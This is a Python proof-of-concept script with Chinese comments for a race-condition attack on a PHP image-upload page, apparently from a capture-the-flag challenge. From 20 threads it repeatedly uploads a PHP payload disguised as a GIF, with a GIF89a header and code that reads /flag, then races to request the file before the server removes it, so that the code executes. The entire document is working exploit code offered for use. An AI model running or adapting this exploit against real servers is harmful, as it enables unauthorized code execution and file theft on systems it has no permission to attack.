# 条件竞争攻击POC
import requests
import threading
import time
import re

# 配置
URL_UPLOAD = "http://localhost/index.php"
URL_ACCESS = "http://localhost/uploads/{}"

# 恶意payload - 伪装成GIF的PHP文件
MALICIOUS_CONTENT = b"GIF89a<?php echo 'SUCCESS:'.file_get_contents('/flag');?>"

found = False
lock = threading.Lock()

def upload_thread():
    global found
    while not found:
        try:
            files = {'image': ('evil.gif', MALICIOUS_CONTENT, 'image/gif')}
            r = requests.post(URL_UPLOAD, files=files, timeout=5)
            if 'Upload successful' in r.text:
                match = re.search(r'uploads/([a-f0-9]+\.gif)', r.text)
                if match:
                    filename = match.group(1)
                    print(f"[+] Uploaded: {filename}")
                    # 立即尝试访问
                    access_file(filename)
        except Exception as e:
            pass

def access_file(filename):
    global found
    for _ in range(100):  # 快速尝试访问100次
        if found:
            return
        try:
            r = requests.get(URL_ACCESS.format(filename), timeout=0.5)
            if 'SUCCESS:' in r.text:
                with lock:
                    if not found:
                        found = True
                        print(f"[!] FLAG FOUND: {r.text}")
                return
        except:
            pass

def main():
    print("[*] Starting race condition attack...")
    print(f"[*] Target: {URL_UPLOAD}")
    
    threads = []
    for i in range(20):
        t = threading.Thread(target=upload_thread)
        t.daemon = True
        t.start()
        threads.append(t)
    
    # 运行60秒
    time.sleep(60)
    
    if not found:
        print("[-] Attack failed, try again or increase threads")

if __name__ == "__main__":
    main()
